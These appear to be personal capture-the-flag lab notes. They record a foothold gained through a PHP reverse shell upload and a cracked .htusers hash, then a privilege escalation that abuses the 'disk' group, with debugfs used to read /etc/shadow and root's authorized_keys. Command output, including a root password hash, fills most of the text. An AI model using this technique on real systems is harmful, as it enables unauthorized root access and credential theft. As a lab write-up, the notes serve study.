#### foot holder
php reverse shell upload and trigger to get www-data

view .htusers get hash of user. crack it and ssh as user

#### priv es
user is in group 'disk'

https://medium.com/@kalashkundaliya/the-disk-group-the-quietest-root-shell-youll-ever-hand-out-2f8137949da8
method 1: get hash from shadow
```
$ id
id
uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
$ groups
groups
dora disk
$ cat /etc/group | grep disk
cat /etc/group | grep disk
disk:x:6:dora
$ ls -la /dev/sd*
ls -la /dev/sd*
brw-rw---- 1 root disk 8, 0 Feb 20  2025 /dev/sda
brw-rw---- 1 root disk 8, 1 Feb 20  2025 /dev/sda1
brw-rw---- 1 root disk 8, 2 Feb 20  2025 /dev/sda2
brw-rw---- 1 root disk 8, 3 Feb 20  2025 /dev/sda3
$ ls -la /dev/mapper/
ls -la /dev/mapper/
total 0
drwxr-xr-x  2 root root      80 Feb 20  2025 .
drwxr-xr-x 18 root root    4060 Feb 20  2025 ..
crw-------  1 root root 10, 236 Feb 20  2025 control
lrwxrwxrwx  1 root root       7 Feb 20  2025 ubuntu--vg-ubuntu--lv -> ../dm-0
$ df -h
df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              199M  1.2M  198M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop4                          68M   68M     0 100% /snap/lxd/22753
/dev/loop2                          50M   50M     0 100% /snap/snapd/18596
/dev/loop3                          92M   92M     0 100% /snap/lxd/24061
/dev/loop1                          64M   64M     0 100% /snap/core20/1852
/dev/sda2                          1.7G  209M  1.4G  13% /boot
tmpfs                              199M     0  199M   0% /run/user/1000
$ lsblk
lsblk
NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0   62M  1 loop /snap/core20/1611
loop1                       7:1    0 63.3M  1 loop /snap/core20/1852
loop2                       7:2    0 49.9M  1 loop /snap/snapd/18596
loop3                       7:3    0 91.9M  1 loop /snap/lxd/24061
loop4                       7:4    0 67.8M  1 loop /snap/lxd/22753
sda                         8:0    0   16G  0 disk 
├─sda1                      8:1    0    1M  0 part 
├─sda2                      8:2    0  1.8G  0 part /boot
└─sda3                      8:3    0 14.3G  0 part 
  └─ubuntu--vg-ubuntu--lv 253:0    0   10G  0 lvm  /
sr0                        11:0    1 1024M  0 rom  
```
method 2: view ssh key
```
$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs 1.45.5 (07-Jan-2020)
debugfs:  cat /etc/shadow
cat /etc/shadow
root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::
daemon:*:19235:0:99999:7:::
bin:*:19235:0:99999:7:::
sys:*:19235:0:99999:7:::
sync:*:19235:0:99999:7:::
games:*:19235:0:99999:7:::
man:*:19235:0:99999:7:::
lp:*:19235:0:99999:7:::
mail:*:19235:0:99999:7:::

$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
debugfs 1.45.5 (07-Jan-2020)
debugfs:  ls /root/.ssh
ls /root/.ssh
WARNING: terminal is not fully functional
-  (press RETURN)
 265478  (12) .    131076  (12) ..    265480  (4060) authorized_keys


debugfs: Unknown request "uit".  Type "?" for a request list.
debugfs:  cat /root/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYTAEOx+KnHDz2LbWVTm9GL+efs2Geyv24rrpvvlRxkGELsCyTmgq+XaorB7tWAPuye8P5YcV0sxJvPAsdxJQLzRP7E8cxHYYqanfLqygkUnKI4HouwseJgQCsc08gR3eDvPHFHLK9SIUZemrCNZnhHcqwEPfPde1s5puNzzkkAVLV61pVo49BHmAsuxNJ45CSaeAmVnwjCL2xkR7Yt3MY3bSGGQX9BEv67Q06gXZ7xkPpNC3u6ZuDxzGZeELxN3DtdTRJInz3MLJgPKHU4HlluyObz05AEyhwiAGYvgBSl9xy9AtGg0350Jb6CjMSH/ASvjc5i+PdsUd6GLXb3OhkyRVLPXnMyeDanu6gdZFk2Sxb1n3HT66bUq7zp8kybFyR739WnotzvF9PO7ymSRcuaRnLFSD/VIqVqQQoNBqIf3D9lmOxMpl157ok5+KCL+c/1F6GL8w9sunk1RRHSarw4tVk+35ObboCw58mgzyWs0fzOKP2LMmUkYWRvXlXR/U= ed@kali
debugfs:  quit
```

#### lesson learned
- .htuser to get hash of user
- group disk to Priv es
